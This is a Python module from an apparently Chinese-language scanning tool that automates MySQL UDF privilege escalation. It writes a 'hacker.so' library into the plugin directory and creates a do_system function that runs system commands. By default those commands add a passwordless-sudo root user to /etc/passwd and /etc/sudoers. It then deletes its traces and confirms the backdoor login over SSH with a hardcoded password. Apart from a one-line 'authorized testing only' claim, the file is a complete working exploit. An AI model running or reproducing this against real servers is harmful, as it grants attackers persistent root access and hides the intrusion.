#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
@Project : YSCAN
@File : mysql_udf.py
@Author : moresuo
@Time : 2026/7/11
@脚本说明 : MySQL UDF 提权（hex 写入 hacker.so → 创建 do_system → 远程命令执行）

前置条件：
  1. MySQL 连接用户必须是 root
  2. 必须有 FILE 权限（文件读写）
  3. MySQL > 5.1 或 MariaDB > 5.1
  4. plugin_dir 可写
  5. secure_file_priv 为空或不限制 plugin_dir

流程：信息收集 → 条件检查 → hex 写表 → DUMPFILE → 清表 → CREATE FUNCTION → 执行命令

仅用于授权安全测试。
"""
import re
import sys
from pathlib import Path

import pymysql
from rich.panel import Panel
from rich.table import Table

from tools.color import console

BASE_DIR = Path(__file__).resolve().parent.parent
HACKER_SO_PATH = BASE_DIR / "libs" / "hacker.so"

# 默认提权命令：创建 moresuo 无密码 root 用户 + sudo 免密
DEFAULT_COMMANDS = [
    'echo "moresuo:advwtv/9yU5yQ:0:0:,,,:/root:/bin/bash" >> /etc/passwd',
    'echo "moresuo ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers',
]


def _locate_so():
    """定位 hacker.so，兼容 PyInstaller frozen 环境。"""
    import sys as _sys
    if getattr(_sys, "frozen", False):
        base = Path(_sys._MEIPASS)
    else:
        base = BASE_DIR
    return base / "libs" / "hacker.so"


def _read_hacker_so():
    """读取 hacker.so 二进制，返回 (bytes, hex_str)。"""
    so_path = _locate_so()
    if not so_path.exists():
        return None, None
    data = so_path.read_bytes()
    return data, data.hex()


def _sql_ok(cursor, sql, label=""):
    """执行 SQL，成功返回 True；失败打印错误并返回 False。"""
    try:
        cursor.execute(sql)
        return True
    except Exception as e:
        console.print(f"  [fail]✗ {label}: {e}[/fail]" if label else f"  [fail]✗ {e}[/fail]")
        return False


# ════════════════════════════════════════════════════════════════
# SSH 验证
# ════════════════════════════════════════════════════════════════

# UDF 创建的后门用户密码（passwd 中的加密密码即 password@123）
_SSH_PASSWORD = "password@123"


def _verify_ssh(host, port=22):
    """SSH 验证 moresuo 用户登录，返回 (ok, output)。"""
    import logging
    import warnings

    try:
        import paramiko
    except ImportError:
        return False, "paramiko 未安装"

    with warnings.catch_warnings():
        warnings.simplefilter("ignore")
        for name in ("paramiko", "paramiko.transport"):
            logger = logging.getLogger(name)
            logger.handlers.clear()
            logger.addHandler(logging.NullHandler())
            logger.propagate = False
            logger.setLevel(logging.CRITICAL)

    ssh = None
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        ssh.connect(
            hostname=host, port=port, username="moresuo",
            password=_SSH_PASSWORD, timeout=10,
            look_for_keys=False, allow_agent=False,
            banner_timeout=5, auth_timeout=10, compress=False,
        )
        _, stdout, _ = ssh.exec_command("whoami && id", timeout=10)
        output = stdout.read().decode("utf-8").strip()
        return True, output
    except Exception as e:
        return False, str(e)
    finally:
        if ssh:
            try:
                ssh.close()
            except Exception:
                pass


# ════════════════════════════════════════════════════════════════
# 信息收集
# ════════════════════════════════════════════════════════════════

def _gather_info(cursor):
    """收集 MySQL 环境信息（版本 / plugin_dir / secure_file_priv / OS）。"""
    info = {}
    for key, sql in [
        ("version", "SELECT VERSION()"),
        ("plugin_dir", "SELECT @@plugin_dir"),
        ("secure_file_priv", "SELECT @@secure_file_priv"),
        ("os", "SELECT @@version_compile_os"),
    ]:
        try:
            cursor.execute(sql)
            info[key] = str(cursor.fetchone()[0] or "")
        except Exception:
            info[key] = ""
    return info


def _check_file_priv(cursor):
    """检查 root 用户是否具备 FILE 权限。"""
    try:
        cursor.execute("SHOW GRANTS FOR CURRENT_USER()")
        for row in cursor.fetchall():
            grant = str(row[0]).upper()
            if "FILE" in grant or "ALL PRIVILEGES" in grant or "GRANT ALL" in grant:
                return True
    except Exception:
        pass
    try:
        cursor.execute("SELECT File_priv FROM mysql.user WHERE User='root' AND Host='localhost'")
        row = cursor.fetchone()
        if row and row[0] == "Y":
            return True
    except Exception:
        pass
    return False


# ════════════════════════════════════════════════════════════════
# 主流程
# ════════════════════════════════════════════════════════════════

def udf_escalate(host, port, password, commands=None):
    """MySQL UDF 提权入口。

    Args:
        host:     目标 IP
        port:     MySQL 端口
        password: root 密码
        commands: 自定义命令列表，None 则使用默认（创建 moresuo 用户）

    Returns:
        bool — 提权是否成功
    """
    if commands is None:
        commands = DEFAULT_COMMANDS

    console.print()
    console.print(Panel.fit(
        f"[accent]目标[/accent]      [host]{host}:{port}[/host]\n"
        f"[accent]用户[/accent]      [highlight]root[/highlight]",
        title="[header]MySQL UDF 提权[/header]",
        border_style="dim",
    ))

    # ── 第 1 步：连接 MySQL ─────────────────────────────────────
    console.print("[info]→ 第 1 步：连接 MySQL[/info]")
    conn = None
    try:
        conn = pymysql.connect(
            host=host, port=int(port), user="root", password=password,
            connect_timeout=10, charset="utf8", autocommit=True,
        )
        console.print("  [success]✔ root 连接成功[/success]")
    except Exception as e:
        console.print(f"  [fail]✗ 连接失败: {e}[/fail]")
        return False

    cursor = conn.cursor()
    info = {}

    try:
        # ── 第 2 步：信息收集 ─────────────────────────────────
        console.print("[info]→ 第 2 步：信息收集[/info]")
        info = _gather_info(cursor)
        info_table = Table(box=None, show_header=False, padding=(0, 2))
        info_table.add_column(style="dim")
        info_table.add_column(style="accent")
        for k, v in info.items():
            info_table.add_row(k, v)
        console.print(info_table)

        # ── 第 3 步：条件检查 ─────────────────────────────────
        console.print("[info]→ 第 3 步：条件检查[/info]")

        conditions = []
        ok = True

        # 版本 ≥ 5.1
        ver = info.get("version", "")
        v_match = re.search(r"^(\d+)\.(\d+)", ver)
        if v_match:
            v_major, v_minor = int(v_match.group(1)), int(v_match.group(2))
            if v_major > 5 or (v_major == 5 and v_minor > 1):
                conditions.append(f"[success]✔ MySQL {ver}（≥ 5.1）[/success]")
            else:
                conditions.append(f"[fail]✗ MySQL {ver}（需 > 5.1）[/fail]")
                ok = False
        else:
            conditions.append(f"[fail]✗ 无法解析版本: {ver}[/fail]")
            ok = False

        # plugin_dir 非空
        plugin_dir = info.get("plugin_dir", "").rstrip("/").rstrip("\\")
        if plugin_dir:
            conditions.append(f"[success]✔ plugin_dir = {plugin_dir}[/success]")
        else:
            conditions.append("[fail]✗ plugin_dir 为空[/fail]")
            ok = False

        # FILE 权限
        if _check_file_priv(cursor):
            conditions.append("[success]✔ 具备 FILE 权限[/success]")
        else:
            conditions.append("[fail]✗ 未检测到 FILE 权限[/fail]")
            ok = False

        # secure_file_priv 提示
        sfp = info.get("secure_file_priv", "")
        if sfp and sfp.strip():
            conditions.append(f"[warn]⚠ secure_file_priv = {sfp}（可能限制 DUMPFILE）[/warn]")
        else:
            conditions.append("[success]✔ secure_file_priv 为空[/success]")

        for c in conditions:
            console.print(f"  {c}")

        if not ok:
            console.print("\n  [fail]✗ 不满足 UDF 提权条件，终止[/fail]")
            return False

        # ── 第 4 步：读取 hacker.so ───────────────────────────
        console.print("[info]→ 第 4 步：读取 hacker.so[/info]")
        so_data, so_hex = _read_hacker_so()
        if not so_data:
            console.print("  [fail]✗ hacker.so 读取失败[/fail]")
            return False
        console.print(f"  [success]✔ hacker.so 就绪（{len(so_data)} bytes）[/success]")

        # ── 第 5 步：hex 写表 ────────────────────────────────
        console.print("[info]→ 第 5 步：写入 hacker.so 到 mysql.hacker 表[/info]")

        # 先确保在 mysql 库
        _sql_ok(cursor, "USE mysql", "切换 mysql 库")
        _sql_ok(cursor, "DROP TABLE IF EXISTS hacker")

        if not _sql_ok(cursor, "CREATE TABLE hacker(data LONGBLOB)", "创建 hacker 表"):
            return False
        console.print("  [success]✔ hacker 表已创建[/success]")

        if not _sql_ok(cursor, f"INSERT INTO hacker VALUES(0x{so_hex})", "写入 hacker.so"):
            _sql_ok(cursor, "DROP TABLE IF EXISTS hacker")
            return False
        console.print(f"  [success]✔ hacker.so 已写入表（{len(so_data)} bytes）[/success]")

        # 验证写入
        cursor.execute("SELECT LENGTH(data) FROM hacker")
        row = cursor.fetchone()
        if row and row[0] == len(so_data):
            console.print(f"  [success]✔ 写入验证通过（{row[0]} bytes）[/success]")
        else:
            console.print(f"  [fail]✗ 写入验证失败（期望 {len(so_data)}，实际 {row[0] if row else '?'}）[/fail]")
            _sql_ok(cursor, "DROP TABLE IF EXISTS hacker")
            return False

        # ── 第 6 步：DUMPFILE → plugin_dir ────────────────────
        dump_path = f"{plugin_dir}/hacker.so"
        console.print(f"[info]→ 第 6 步：DUMPFILE → {dump_path}[/info]")

        try:
            cursor.execute(f"SELECT data FROM hacker INTO DUMPFILE '{dump_path}'")
            console.print(f"  [success]✔ hacker.so 已写入 {dump_path}[/success]")
        except Exception as e:
            err = str(e)
            if "already exists" in err.lower() or "exists" in err.lower():
                console.print(f"  [warn]⚠ hacker.so 已存在，跳过写入[/warn]")
            else:
                console.print(f"  [fail]✗ DUMPFILE 写入失败: {err}[/fail]")
                _sql_ok(cursor, "DROP TABLE IF EXISTS hacker")
                return False

        # ── 第 7 步：清理表（擦屁股）─────────────────────────
        console.print("[info]→ 第 7 步：清理痕迹[/info]")
        _sql_ok(cursor, "DROP TABLE IF EXISTS hacker")
        console.print("  [success]✔ hacker 表已删除[/success]")

        # ── 第 8 步：创建自定义函数 ───────────────────────────
        console.print("[info]→ 第 8 步：创建 do_system 函数[/info]")
        try:
            cursor.execute("CREATE FUNCTION do_system RETURNS INTEGER SONAME 'hacker.so'")
            console.print("  [success]✔ do_system 函数创建成功[/success]")
        except Exception as e:
            err = str(e)
            if "already exists" in err.lower() or "exists" in err.lower():
                console.print(f"  [warn]⚠ 函数已存在，跳过创建[/warn]")
            else:
                console.print(f"  [fail]✗ 创建函数失败: {err}[/fail]")
                return False

        # ── 第 9 步：执行命令 ─────────────────────────────────
        console.print("[info]→ 第 9 步：执行提权命令[/info]")
        for cmd in commands:
            try:
                cursor.execute(f"SELECT do_system('{cmd}')")
                result = cursor.fetchone() or ("?",)
                console.print(f"  [success]✔[/success] [dim]{cmd[:90]}[/dim] [dim]→ {result[0]}[/dim]")
            except Exception as e:
                console.print(f"  [fail]✗ {cmd[:80]}... → {e}[/fail]")

        # ── 第 10 步：删除函数（清理痕迹）─────────────────────
        console.print("[info]→ 第 10 步：删除 do_system 函数[/info]")
        _sql_ok(cursor, "DROP FUNCTION IF EXISTS do_system")
        console.print("  [success]✔ do_system 已删除[/success]")

        # ── 第 11 步：SSH 验证 moresuo 登录 ────────────────────
        console.print("[info]→ 第 11 步：SSH 验证 moresuo 登录[/info]")
        ssh_ok, ssh_output = _verify_ssh(host)
        if ssh_ok:
            console.print(f"  [success]✔ SSH 验证成功[/success]")
            for line in ssh_output.strip().split("\n"):
                console.print(f"    [success]{line}[/success]")
        else:
            console.print(f"  [fail]✗ SSH 验证失败: {ssh_output}[/fail]")

        # ── 汇总 ──────────────────────────────────────────────
        console.print()
        summary = Table(box=None, show_header=False, padding=(0, 2))
        summary.add_column(style="dim")
        summary.add_column(style="accent")
        summary.add_row("目标主机", f"{host}:{port}")
        summary.add_row("MySQL 版本", info.get("version", "?"))
        summary.add_row("plugin_dir", plugin_dir)
        summary.add_row("UDF 路径", dump_path)
        summary.add_row("SSH 验证", f"[success]通过[/success]" if ssh_ok else f"[fail]失败[/fail]")
        summary.add_row("远程登录", f"ssh moresuo@{host}")
        summary.add_row("提权验证", f"ssh moresuo@{host} 'whoami'")
        console.print(Panel(summary, title="[header]UDF 提权完成[/header]", border_style="success"))

        return ssh_ok

    finally:
        try:
            cursor.close()
        except Exception:
            pass
        try:
            conn.close()
        except Exception:
            pass
